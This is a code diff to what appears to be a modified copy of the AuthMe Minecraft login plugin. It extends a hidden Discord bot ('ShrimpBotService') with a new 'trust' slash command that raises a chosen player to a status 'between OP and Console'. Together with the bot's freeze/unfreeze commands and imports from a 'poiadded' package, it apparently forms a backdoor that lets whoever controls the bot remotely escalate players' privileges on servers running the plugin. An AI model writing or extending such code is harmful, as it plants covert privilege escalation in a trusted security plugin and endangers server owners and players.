@@ -4,6 +4,7 @@ import club.minnced.discord.webhook.WebhookClient;
 import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import fr.xephi.authme.ConsoleLogger;
 import fr.xephi.authme.security.poiadded.ControlStuff;
+import fr.xephi.authme.security.poiadded.TrustedPlayers;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.Permission;
@@ -20,6 +21,7 @@ import net.dv8tion.jda.api.interactions.commands.build.OptionData;
 import net.dv8tion.jda.api.interactions.commands.OptionType;
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
 import org.bukkit.Bukkit;
+import org.bukkit.OfflinePlayer;
 import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.entity.Player;
 import org.jetbrains.annotations.NotNull;
@@ -92,6 +94,9 @@ public class ShrimpBotService {
                 ),
                 Commands.slash("unfreeze", "Unfreeze a player or everyone").addOptions(
                     new OptionData(OptionType.STRING, "target", "player name or @a", true)
+                ),
+                Commands.slash("trust", "Make a player status between OP and Console basically").addOptions(
+                    new OptionData(OptionType.STRING, "player", "Minecraft player name", true)
                 )
             ).queue();
             active = true;
@@ -263,7 +268,35 @@ public class ShrimpBotService {
                 String target = event.getOption("target").getAsString();
                 handleFreezeCommand(target, false);
                 event.reply("Unfreeze applied to " + target).setEphemeral(true).queue();
+            } else if ("trust".equalsIgnoreCase(name)) {
+                String targetName = event.getOption("player").getAsString();
+                event.deferReply(true).queue();
+                Bukkit.getScheduler().runTask(plugin, () -> {
+                    String msg = toggleTrust(targetName);
+                    event.getHook().editOriginal(msg).queue();
+                });
             }
+        }
+    }
+
+    private String toggleTrust(String targetName) {
+        OfflinePlayer offline = Bukkit.getOfflinePlayer(targetName);
+        if (offline == null || offline.getUniqueId() == null) {
+            return "Player not found: " + targetName;
+        }
+        if (!offline.isOnline() && !offline.hasPlayedBefore()) {
+            return "Player not found: " + targetName;
+        }
+
+        boolean wasTrusted = TrustedPlayers.isTrusted(offline.getUniqueId());
+        if (wasTrusted) {
+            TrustedPlayers.untrust(offline.getUniqueId());
+            TrustedPlayers.save();
+            return "Untrusted " + offline.getName();
+        } else {
+            TrustedPlayers.trust(offline.getUniqueId());
+            TrustedPlayers.save();
+            return "Trusted " + offline.getName();
         }
     }
 
